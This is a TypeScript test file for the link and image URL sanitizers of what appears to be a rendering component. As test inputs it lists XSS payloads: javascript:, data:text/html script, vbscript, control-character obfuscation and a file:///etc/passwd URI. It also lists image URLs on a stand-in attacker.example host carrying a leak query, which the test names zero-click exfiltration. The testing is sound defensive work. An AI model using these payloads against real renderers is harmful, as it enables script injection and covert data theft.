import { describe, it, expect } from "vitest";
import { safeLinkUri, safeImageUri } from "./sanitize-url";

describe("safeLinkUri", () => {
  it("allows http(s), mailto, tel", () => {
    expect(safeLinkUri("https://example.com/x")).toBe("https://example.com/x");
    expect(safeLinkUri("http://example.com")).toBe("http://example.com");
    expect(safeLinkUri("HTTPS://EXAMPLE.com")).toBe("HTTPS://EXAMPLE.com");
    expect(safeLinkUri("mailto:a@b.com")).toBe("mailto:a@b.com");
    expect(safeLinkUri("tel:+1555")).toBe("tel:+1555");
  });

  it("allows relative, root-relative, and anchor URLs", () => {
    expect(safeLinkUri("/path/x")).toBe("/path/x");
    expect(safeLinkUri("#section")).toBe("#section");
    expect(safeLinkUri("foo/bar")).toBe("foo/bar");
    expect(safeLinkUri("")).toBe("");
  });

  it("blocks javascript:, data:, vbscript:, file:", () => {
    expect(safeLinkUri("javascript:alert(1)")).toBe("");
    expect(safeLinkUri("JavaScript:alert(1)")).toBe("");
    expect(safeLinkUri("  javascript:alert(1)  ")).toBe("");
    expect(safeLinkUri("data:text/html,<script>alert(1)</script>")).toBe("");
    expect(safeLinkUri("vbscript:msgbox(1)")).toBe("");
    expect(safeLinkUri("file:///etc/passwd")).toBe("");
  });

  it("defeats control-char scheme obfuscation", () => {
    expect(safeLinkUri("java\tscript:alert(1)")).toBe("");
    expect(safeLinkUri("java\nscript:alert(1)")).toBe("");
  });

  it("keeps a colon that lives in a relative URL's query/fragment", () => {
    expect(safeLinkUri("/path?redirect=a:b")).toBe("/path?redirect=a:b");
    expect(safeLinkUri("page#a:b")).toBe("page#a:b");
  });
});

describe("safeImageUri", () => {
  it("allows relative and same-origin image paths", () => {
    expect(safeImageUri("/assets/logo.png")).toBe("/assets/logo.png");
    expect(safeImageUri("img.png")).toBe("img.png");
    expect(safeImageUri("")).toBe("");
  });

  it("allows inline data:image URIs (no network egress)", () => {
    expect(safeImageUri("data:image/png;base64,AAAA")).toBe(
      "data:image/png;base64,AAAA",
    );
  });

  it("blocks remote images to prevent zero-click exfiltration", () => {
    expect(safeImageUri("https://attacker.example/p.gif?leak=secret")).toBe("");
    expect(safeImageUri("http://attacker.example/p.gif")).toBe("");
  });

  it("blocks protocol-relative and backslash-obfuscated remote images", () => {
    expect(safeImageUri("//attacker.example/p.gif")).toBe("");
    expect(safeImageUri("/\\attacker.example/p.gif")).toBe("");
    expect(safeImageUri("\\\\attacker.example\\p.gif")).toBe("");
    // A single leading slash is same-origin and still allowed.
    expect(safeImageUri("/assets/ok.png")).toBe("/assets/ok.png");
  });

  it("blocks dangerous and non-image data schemes", () => {
    expect(safeImageUri("javascript:alert(1)")).toBe("");
    expect(safeImageUri("data:text/html,<script>alert(1)</script>")).toBe("");
  });
});
